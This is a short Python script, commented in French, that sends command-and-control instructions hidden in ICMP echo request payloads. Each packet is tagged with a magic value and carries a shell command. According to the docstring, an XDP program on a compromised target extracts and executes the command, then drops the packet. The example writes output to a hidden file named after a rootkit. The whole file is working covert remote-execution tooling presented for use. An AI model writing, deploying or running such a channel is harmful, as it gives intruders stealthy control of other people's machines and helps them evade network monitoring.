#!/usr/bin/env python3
"""
Envoi de commandes C2 via ICMP Echo Request.

Le payload ICMP contient :
  - Magic 0xDEAD1337 (4 octets, big-endian)
  - Commande en ASCII

Le programme XDP cote cible intercepte le paquet,
extrait la commande et l'execute, puis drop le paquet.

Usage:
    sudo python3 icmp_c2_send.py <cible> <commande>

Exemple:
    sudo python3 icmp_c2_send.py 192.168.1.100 "id > /tmp/.rk_out"
"""
import sys
import struct
import socket


def checksum(data: bytes) -> int:
    """Calcul du checksum ICMP (RFC 1071)."""
    s = 0
    for i in range(0, len(data) - 1, 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    if len(data) % 2:
        s += data[-1] << 8
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def send_c2(target: str, cmd: str) -> None:
    """Envoie une commande C2 cachee dans un ICMP Echo Request."""
    ICMP_ECHO = 8
    MAGIC = 0xDEAD1337

    # Construction du payload : magic + commande
    magic_bytes = struct.pack("!I", MAGIC)
    cmd_bytes = cmd.encode("utf-8")
    payload = magic_bytes + cmd_bytes

    # En-tete ICMP : type(8), code(0), checksum(0), id(0), seq(0)
    icmp_header = struct.pack("!BBHHH", ICMP_ECHO, 0, 0, 0, 0)
    packet = icmp_header + payload

    # Recalcul du checksum
    csum = checksum(packet)
    icmp_header = struct.pack("!BBHHH", ICMP_ECHO, 0, csum, 0, 0)
    packet = icmp_header + payload

    # Envoi via raw socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.sendto(packet, (target, 0))
    sock.close()

    print(f"[+] Commande C2 envoyee a {target}: {cmd}")


def main():
    if len(sys.argv) < 3:
        print(f"Usage: sudo {sys.argv[0]} <cible> <commande>")
        print(f"Exemple: sudo {sys.argv[0]} 192.168.1.100 \"id > /tmp/.rk_out\"")
        sys.exit(1)

    target = sys.argv[1]
    cmd = " ".join(sys.argv[2:])
    send_c2(target, cmd)


if __name__ == "__main__":
    main()
